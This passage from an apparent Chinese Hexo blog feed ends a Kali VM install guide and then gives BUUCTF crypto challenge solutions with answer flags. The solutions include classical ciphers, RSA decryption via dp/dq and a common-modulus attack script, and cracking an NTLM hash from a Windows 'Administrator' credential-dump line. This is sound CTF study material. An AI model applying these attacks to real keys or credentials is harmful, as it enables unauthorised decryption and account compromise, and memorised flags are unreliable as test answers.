src="/images/wordimage/2022/222/passwd.png"></p><p>然后一路下一步直到，如下图，选择<code>yes</code>👇,然后还是一路下一步，等待安装完毕即可。</p><p><img src="/images/wordimage/2022/222/yes.png"></p><p>然后安装到如下图的地方的时候选择/dev/sda/如下图👇</p><p><img src="/images/wordimage/2022/222/dev.png"></p><hr><h2 id="四-配置Kali-Linux系统"><a href="#四-配置Kali-Linux系统" class="headerlink" title="四.配置Kali Linux系统"></a>四.配置Kali Linux系统</h2><p>至此如下图，安装完成，下一步重启即可</p><p><img src="/images/wordimage/2022/222/reboot.png"></p><p>KALI安装成功界面如下👇</p><p><img src="/images/wordimage/2022/222/kaliOK.png"></p><h3 id="1-修改root密码"><a href="#1-修改root密码" class="headerlink" title="1.修改root密码"></a>1.修改root密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">passwd</span> root <span class="token comment">#更改root密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 虚拟机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> Kali虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Crypto第一页(传统知识+古典密码-RSAROLL)解题思路</title>
      <link href="/2022/0228e052bc.html"/>
      <url>/2022/0228e052bc.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对应的上一篇文章👉<a href="https://blog.takagisan.top/2022/01812cc16c.html">BUUCTF-Crypto第一页(MD5-信息化时代的步伐)解题思路</a>。</p><h2 id="一-传统知识-古典密码"><a href="#一-传统知识-古典密码" class="headerlink" title="一.传统知识+古典密码"></a>一.传统知识+古典密码</h2><p>下载附件打开题目一看就知道，是六十甲子，关于六十甲子如何对应，非常简单，不需要记住，也不需要百度，电脑肯定有Excel表吧，如下图操作👇，往下面拉到六十行就可以了。</p><p><img src="/images/wordimage/20220211/jiazi.png"></p><p>最终差不多是这个样子如下图👇。</p><p><img src="/images/wordimage/20220211/jiazi2.png"></p><p>或者是可以直接参考我这个表格。</p><table><thead><tr><th align="center">顺序</th><th align="center">干支</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">甲子</td></tr><tr><td align="center">2</td><td align="center">乙丑</td></tr><tr><td align="center">3</td><td align="center">丙寅</td></tr><tr><td align="center">4</td><td align="center">丁卯</td></tr><tr><td align="center">5</td><td align="center">戊辰</td></tr><tr><td align="center">6</td><td align="center">己巳</td></tr><tr><td align="center">7</td><td align="center">庚午</td></tr><tr><td align="center">8</td><td align="center">辛未</td></tr><tr><td align="center">9</td><td align="center">壬申</td></tr><tr><td align="center">10</td><td align="center">癸酉</td></tr><tr><td align="center">11</td><td align="center">甲戌</td></tr><tr><td align="center">12</td><td align="center">乙亥</td></tr><tr><td align="center">13</td><td align="center">丙子</td></tr><tr><td align="center">14</td><td align="center">丁丑</td></tr><tr><td align="center">15</td><td align="center">戊寅</td></tr><tr><td align="center">16</td><td align="center">己卯</td></tr><tr><td align="center">17</td><td align="center">庚辰</td></tr><tr><td align="center">18</td><td align="center">辛巳</td></tr><tr><td align="center">19</td><td align="center">壬午</td></tr><tr><td align="center">20</td><td align="center">癸未</td></tr><tr><td align="center">21</td><td align="center">甲申</td></tr><tr><td align="center">22</td><td align="center">乙酉</td></tr><tr><td align="center">23</td><td align="center">丙戌</td></tr><tr><td align="center">24</td><td align="center">丁亥</td></tr><tr><td align="center">25</td><td align="center">戊子</td></tr><tr><td align="center">26</td><td align="center">己丑</td></tr><tr><td align="center">27</td><td align="center">庚寅</td></tr><tr><td align="center">28</td><td align="center">辛卯</td></tr><tr><td align="center">29</td><td align="center">壬辰</td></tr><tr><td align="center">30</td><td align="center">癸巳</td></tr><tr><td align="center">31</td><td align="center">甲午</td></tr><tr><td align="center">32</td><td align="center">乙未</td></tr><tr><td align="center">33</td><td align="center">丙申</td></tr><tr><td align="center">34</td><td align="center">丁酉</td></tr><tr><td align="center">35</td><td align="center">戊戌</td></tr><tr><td align="center">36</td><td align="center">己亥</td></tr><tr><td align="center">37</td><td align="center">庚子</td></tr><tr><td align="center">38</td><td align="center">辛丑</td></tr><tr><td align="center">39</td><td align="center">壬寅</td></tr><tr><td align="center">40</td><td align="center">癸卯</td></tr><tr><td align="center">41</td><td align="center">甲辰</td></tr><tr><td align="center">42</td><td align="center">乙巳</td></tr><tr><td align="center">43</td><td align="center">丙午</td></tr><tr><td align="center">44</td><td align="center">丁未</td></tr><tr><td align="center">45</td><td align="center">戊申</td></tr><tr><td align="center">46</td><td align="center">己酉</td></tr><tr><td align="center">47</td><td align="center">庚戌</td></tr><tr><td align="center">48</td><td align="center">辛亥</td></tr><tr><td align="center">49</td><td align="center">壬子</td></tr><tr><td align="center">50</td><td align="center">癸丑</td></tr><tr><td align="center">51</td><td align="center">甲寅</td></tr><tr><td align="center">52</td><td align="center">乙卯</td></tr><tr><td align="center">53</td><td align="center">丙辰</td></tr><tr><td align="center">54</td><td align="center">丁巳</td></tr><tr><td align="center">55</td><td align="center">戊午</td></tr><tr><td align="center">56</td><td align="center">己未</td></tr><tr><td align="center">57</td><td align="center">庚申</td></tr><tr><td align="center">58</td><td align="center">辛酉</td></tr><tr><td align="center">59</td><td align="center">壬戌</td></tr><tr><td align="center">60</td><td align="center">癸亥</td></tr></tbody></table><p>然后在根据左边的数字对应，题目是<code>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳</code>，找到对应的数字编号是<code>28，30，23，8，17，10，16，30</code>，写着加甲子这句话，所以需要加60即可，就是<code>88，90，83，68，77，70，76，90</code>，猜测是ASCII编码如下图👇。</p><p><img src="/images/wordimage/20220211/ASCII.jpg"></p><p>找出对应的字母分别是<code>88:X，90:Z，83:S，68:D，77:M，70:F，76:L，90:Z</code>，就是<code>XZSDMFLZ</code>，最开始我就以为是flag了，原来还要进行一次解密，这种样子的密码不是凯撒就是栅栏，凯撒尝试过后，发现没有一个能通顺的，应该就是栅栏了👉<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">在线栅栏解密</a>，也不对啊，最后尝试的是，先把<code>XZSDMFLZ</code>进行每组数字为<code>2</code>的解密为<code>XMZFSLDZ</code>之后，在去凯撒解密，凯撒解密是移动<code>21</code>位，结果位<code>shuangyu</code>，真离谱，这个答案尝试了很多次，一直报错，原来是需要把答案大写，出题人nm$l。</p><p>顺便附上凯撒加密解密python代码如下👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">caser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">"XMZFSLDZ"</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    dict_txt <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>            enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dict_txt<span class="token punctuation">[</span>dict_txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">#寻找i里面的dict_txt的索引值加上k</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"移动了%d位"</span><span class="token operator">%</span>k<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment">#每次循环完毕，列表清空</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    caser<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面是栅栏的代码，借鉴(抄)的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">zhalan</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    elen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    field <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> elen<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>elen <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            field<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> f <span class="token keyword">in</span> field<span class="token punctuation">:</span>        b <span class="token operator">=</span> elen <span class="token operator">//</span> f        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span> <span class="token string">''</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>elen<span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">=</span> i <span class="token operator">%</span> b<span class="token punctuation">;</span>            result<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>a<span class="token punctuation">:</span> result<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>            d <span class="token operator">=</span> d <span class="token operator">+</span> result<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        d<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    e <span class="token operator">=</span> <span class="token string">'XZSDMFLZ'</span>    zhalan<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终flag:<code>flag&#123;SHUANGYU&#125;</code></p><hr><h2 id="二-凯撒？替换？呵呵"><a href="#二-凯撒？替换？呵呵" class="headerlink" title="二.凯撒？替换？呵呵!"></a>二.凯撒？替换？呵呵!</h2><p>没有附件，密文如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看起来是一道简单的凯撒，没错这是我以为的，我一直在找MTHJ对应flag是怎么对应的，普通的移位，不行，找ASCII编码也不行，自己想了一分钟之后才知道需要爆破(其实是看了大佬的WP)，👉<a href="https://quipqiup.com/">在线工具</a>，如下图。</p><p><img src="/images/wordimage/20220211/replace.png"></p><p>然后去掉空格，即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;substitutioncipherdecryptionisalways easy just like a piece of cake&#125;'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终flag是,flag:<code>flag&#123;substitutioncipherdecryptionisalwayseasyjustlikeapieceofcake&#125;</code>。</p><hr><h2 id="三-萌萌哒的八戒"><a href="#三-萌萌哒的八戒" class="headerlink" title="三.萌萌哒的八戒"></a>三.萌萌哒的八戒</h2><p>题目提示如下。</p><blockquote><p>萌萌哒的八戒原来曾经是猪村的村长，从远古时期，猪村就有一种神秘的代码。请从附件中找出代码，看看萌萌哒的猪八戒到底想说啥 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>看题目猜测是猪圈密码，下载附件查看，如下图，看来还真是猪圈密码了，不知道猪圈密码的可以看这边的文章👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html">猪圈密码</a>。</p><p><img src="/images/wordimage/20220211/bajie.jpg"></p><p>对照表如下。</p><p><img src="/images/wordimage/20220201/zhujuan2.png"></p><p>根据对照表，找出图片的明文分别是<code>whenthepigwanttoeat</code>。</p><p>最终flag是:<code>flag&#123;whenthepigwanttoeat&#125;</code>。</p><hr><h2 id="四-RSA1"><a href="#四-RSA1" class="headerlink" title="四.RSA1"></a>四.RSA1</h2><p>下载附件的内容是👇。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说实话，我特么实在是看不懂dp和dq，大概意思如下👇，👉<a href="https://blog.csdn.net/MikeCoke/article/details/105959599">RSAdp和dq</a>，不管了直接代码梭哈完事。</p><blockquote><p>dp=d%(p-1)<br>dq=d%(q-1)</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>libnump <span class="token operator">=</span> <span class="token number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>q <span class="token operator">=</span> <span class="token number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>dp <span class="token operator">=</span> <span class="token number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>dq <span class="token operator">=</span> <span class="token number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>c <span class="token operator">=</span> <span class="token number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span>I <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>q<span class="token punctuation">,</span>p<span class="token punctuation">)</span>mp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dp<span class="token punctuation">,</span>p<span class="token punctuation">)</span>mq <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>dq<span class="token punctuation">,</span>q<span class="token punctuation">)</span>               <span class="token comment">#求幂取模运算</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mp<span class="token operator">-</span>mq<span class="token punctuation">)</span><span class="token operator">*</span>I<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span>q<span class="token operator">+</span>mq       <span class="token comment">#求明文公式</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment">#转为十六进制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后结果是十六进制转换字符即可，👉<a href="https://www.sojson.com/hexadecimal.html">十六进制转字符</a>。</p><p>最终结果<code>flag&#123;W31c0m3_70_Ch1n470wn&#125;</code>。</p><hr><h2 id="五-权限获得第一步"><a href="#五-权限获得第一步" class="headerlink" title="五.权限获得第一步"></a>五.权限获得第一步</h2><p>题目内容如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密第二个md5即可。</p><p>flag:<code>flag&#123;3617656&#125;</code></p><hr><h2 id="六-old-fashion"><a href="#六-old-fashion" class="headerlink" title="六.old-fashion"></a>六.old-fashion</h2><p>题目内容如下。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看样子是需要做词频分析，在线网站👉<a href="https://quipqiup.com/">词频分析</a>，结果 如下图。</p><p><img src="/images/wordimage/20220211/cipin.png"></p><p>所以最终flag是<code>flag&#123;n1_2hen-d3_hu1-mi-ma_a&#125;</code>。</p><hr><h2 id="七-世上无难事"><a href="#七-世上无难事" class="headerlink" title="七.世上无难事"></a>七.世上无难事</h2><p>提示如下。</p><blockquote><p>以下是某国现任总统外发的一段指令，经过一种奇异的加密方式，毫无规律，看来只能分析了。请将这段语句还原成通顺语句，并从中找到key作为答案提交，答案是32位，包含小写字母。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目内容👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我还以为又是什么我没见过的加密方式，这下我算是搞懂了，只要是奇奇怪怪的，基本上都是词频分析👉<a href="https://quipqiup.com/">词频分析</a>，如下图👇。</p><p><img src="/images/wordimage/20220211/cipin2.png"></p><p>我就按照这个答案一直提交，咋就一直错误，转小写233333.</p><p>最终flag是<code>flag&#123;640e11012805f211b0ab24ff02a1ed09&#125;</code></p><hr><h2 id="八-RSA3"><a href="#八-RSA3" class="headerlink" title="八.RSA3"></a>八.RSA3</h2><p>真的四草了，又是RSA，估计我现在对RSA的题目都有阴影了。</p><p>题目内容如下👇</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">c1= 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n= 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1= 11187289c2= 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2= 9647291<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先我知道的是需要理解欧几里得算法，<strong>欧几里得算法大概意思就是求公约数，在两个数之间选一个较大的数字，然后除以较小的数字获得余数，然后在用被除数除以余数，一直到0即可</strong>，如下带数操作，假设有两个数字一个是<code>2004</code>，一个是<code>615</code>，求公约数。</p><p><code>2004 / 615 = 3.......159 </code></p><p><code>615 / 159 = 3....... 138</code></p><p><code>159 / 138 = 1.......21 </code></p><p><code>138 / 21 = 6.......12</code></p><p><code>21 / 12 = 1.......9</code></p><p><code>12 / 9 = 1.......3</code></p><p><code>9 / 3 = 3.......0</code></p><p>求出<code>2004</code>和<code>615</code>的最大公约数是<code>3</code>，既然知道了欧几里得，就可以做题了，理解可以看这个文章👉<a href="https://www.cnblogs.com/gwind/p/8013154.html">RSA共模攻击</a>，直接上代码，👇。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">gongmo</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>            <span class="token keyword">return</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y    s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 求模反元素</span>    <span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s1 <span class="token operator">=</span> <span class="token operator">-</span> s1        c1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        s2 <span class="token operator">=</span> <span class="token operator">-</span> s2        c2 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">return</span> mc1<span class="token operator">=</span> <span class="token number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span>n<span class="token operator">=</span> <span class="token number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span>e1<span class="token operator">=</span> <span class="token number">11187289</span>c2<span class="token operator">=</span> <span class="token number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span>e2<span class="token operator">=</span> <span class="token number">9647291</span>result <span class="token operator">=</span> gongmo<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终flag是<code>flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;</code>。</p><p>参考文章</p><p><code>[1]https://blog.csdn.net/weixin_45859850/article/details/109556891</code></p><p><code>[2]https://fuchenchenle.cn/2020/06/10/rsa/#toc-heading-4</code></p><hr><h2 id="九-RSA2"><a href="#九-RSA2" class="headerlink" title="九.RSA2"></a>九.RSA2</h2><p>题目如下👇，这些RSA的题目感觉不是我这个土狗中专生能做的。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">e = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="十-Unencode"><a href="#十-Unencode" class="headerlink" title="十.Unencode"></a>十.Unencode</h2><p>题目内容是👇</p><pre class="line-numbers language-text" data-language="text"><code 